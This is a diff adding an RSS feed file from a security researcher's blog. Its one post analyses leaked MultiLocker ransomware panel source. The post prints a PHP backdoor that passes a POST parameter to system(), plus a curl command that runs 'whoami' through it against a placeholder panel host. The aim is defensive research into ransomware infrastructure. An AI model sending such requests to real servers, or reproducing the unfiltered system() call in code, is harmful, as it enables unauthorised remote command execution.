@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Multilocker on @botnet_hunter&#39;s blog</title>
+    <link>http://bwall.github.io/tags/multilocker/</link>
+    <description>Recent content in Multilocker on @botnet_hunter&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© 2015 Copyright Brian Wallace</copyright>
+    <lastBuildDate>Sun, 09 Mar 2014 10:19:07 -0700</lastBuildDate>
+    <atom:link href="http://bwall.github.io/tags/multilocker/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>MultiLocker Backdoor</title>
+      <link>http://bwall.github.io/multilocker-backdoor/</link>
+      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
+      
+      <guid>http://bwall.github.io/multilocker-backdoor/</guid>
+      <description>&lt;p&gt;In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&amp;rsquo;s panel.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &amp;lsquo;lending/PL.php&amp;rsquo;, there is some obvious backdoor code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if (!empty($_POST[&#39;c&#39;]))
+{
+system($_POST[&#39;c&#39;]);
+die();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This can easily be accessed with curl or wget (let&amp;rsquo;s assume &lt;a href=&#34;http://c2.panel/&#34;&gt;http://c2.panel/&lt;/a&gt; is the MultiLocker panel root).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;curl -v -d &amp;quot;c=whoami&amp;quot; http://c2.panel/lending/PL.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For more information on MultiLocker, you can check out a great blog post on it &lt;a href=&#34;http://www.xylibox.com/2012/11/multi-locker.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
